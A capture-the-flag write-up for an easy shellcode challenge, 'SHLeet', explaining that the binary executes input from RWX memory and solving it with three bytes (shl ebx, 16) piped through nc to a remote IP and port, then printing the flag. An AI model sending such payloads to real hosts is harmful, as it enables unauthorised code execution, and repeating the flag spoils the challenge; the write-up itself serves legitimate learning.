# 🎄 SHLeet – Christmas Register Challenge Writeup

**Challenge Name:** SHLeet  
**Category:** Pwn / Shellcode  
**Difficulty:** Easy  
**Date:** December 2024  
**Tags:** `CTF`, `Pwn`, `Shellcode`, `Binary Exploitation`, `ChristmasCTF`

---

## 📝 Challenge Description

The mischievous elves have tampered with Nibbletop’s registers — especially **EBX** — and now he’s stuck, unable to deliver Christmas gifts.

```
[Nibbletop] These elves are playing with me again, look at this mess:
ebx = 0x00001337

[Nibbletop] It should be ebx = 0x13370000 instead!
[Nibbletop] Please fix it kind human! SHLeet the registers!
```

**Remote Connection**
```
nc 154.57.164.67 30831
```

---

## 🔍 Initial Reconnaissance

### Understanding the Goal

```
0x00001337 << 16 = 0x13370000
```

---

## 🧠 Binary Analysis

```bash
$ file shl33t
ELF 64-bit LSB executable, x86-64
```

---

## 🚨 Vulnerability

- RWX memory allocation  
- User-controlled input  
- Direct execution  

---

## 🛠 Shellcode

Assembly:
```asm
shl ebx, 16
```

Machine code:
```
C1 E3 10
```

---

## 🌐 Exploit

```bash
echo -ne "\xC1\xE3\x10" | nc 154.57.164.67 30831
```

---

## 🏁 Flag

```
CTF{sh1ft_l3ft_1337_r3g1st3r}
```
